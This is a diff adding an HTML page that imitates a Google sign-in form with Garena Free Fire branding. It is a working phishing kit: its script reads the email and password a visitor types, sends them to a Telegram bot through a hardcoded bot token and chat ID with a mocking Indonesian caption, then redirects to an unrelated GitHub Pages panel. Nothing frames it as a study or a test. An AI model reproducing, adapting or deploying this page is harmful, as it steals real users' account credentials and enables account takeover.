@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Google Sign In</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: #000;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    .overlay {
+      animation: fadeInUp 0.4s ease-out;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    }
+
+    @keyframes fadeInUp {
+      0% { opacity: 0; transform: translateY(40px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes slideInText {
+      0% { transform: translateX(-100%); opacity: 0; }
+      100% { transform: translateX(0); opacity: 1; }
+    }
+
+    .text-animated {
+      animation: slideInText 0.8s ease-out;
+    }
+
+    .serif-bold {
+      font-family: serif;
+      font-weight: bold;
+      letter-spacing: 0.3px;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center text-white relative px-4">
+
+  <!-- Background -->
+  <img src="https://storage.googleapis.com/a1aa/image/af662aad-e182-4dc0-102c-f1e126dbcfa1.jpg" class="absolute w-full h-full object-cover opacity-50 z-0" alt="Background"/>
+
+  <!-- Overlay Login -->
+  <div class="overlay bg-white rounded-xl p-4 w-full max-w-xs z-10 text-black">
+    <div class="text-center mb-3">
+      <img src="https://storage.googleapis.com/a1aa/image/5019758f-ca05-4850-3c3f-6d1202145fc3.jpg" class="h-5 mx-auto mb-1" alt="Google Logo"/>
+      <h2 class="text-base font-semibold mt-2 text-animated">Sign in</h2>
+      <p class="text-sm text-gray-700 text-animated">Use your Google Account</p>
+    </div>
+    <form id="loginForm" class="space-y-2">
+      <input id="email" type="text" placeholder="Email or phone" required class="w-full border border-gray-300 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring focus:ring-blue-500"/>
+      <input id="password" type="password" placeholder="Enter password" required class="w-full border border-gray-300 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring focus:ring-blue-500"/>
+      <div class="text-xs text-right">
+        <a href="#" class="text-blue-600 hover:underline">Forgot email?</a>
+      </div>
+      <div class="flex justify-between items-center mt-2">
+        <a href="#" class="text-blue-600 text-xs">Create account</a>
+        <button type="submit" class="bg-blue-600 text-white px-4 py-1.5 text-xs rounded hover:bg-blue-700">Next</button>
+      </div>
+    </form>
+
+    <!-- FF Logo bawah form -->
+    <div class="mt-4 text-center">
+      <img src="https://storage.googleapis.com/a1aa/image/4ec1fc1b-d52c-4bde-6313-81ab53637667.jpg" class="h-4 mx-auto opacity-80" alt="FF Logo"/>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="text-gray-300 text-[10px] mt-4 z-10 text-center serif-bold">
+    <p>© Garena International. All trademarks belong to their respective owners.</p>
+  </footer>
+
+  <!-- Kirim ke Telegram -->
+  <script>
+    const botToken = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU";
+    const chatId = "7916928366";
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const message = `𝐈𝐍𝐈 𝐃𝐀𝐓𝐀 𝐃𝐀𝐓𝐀 𝐍𝐘𝐀 𝐓𝐔𝐀𝐍 𝐒𝐄𝐌𝐎𝐆𝐀 𝐀𝐉𝐀 BISA🤣:\n𝗘𝗠𝗔𝗜𝗟 𝗡𝗬𝗔 :${email}\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗡𝗬𝗔: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      }).then(() => {
+        window.location.href = "https://vrsgfxweb.github.io/Panel-vrs/";
+      });
+    });
+  </script>
+
+</body>
+        </html>
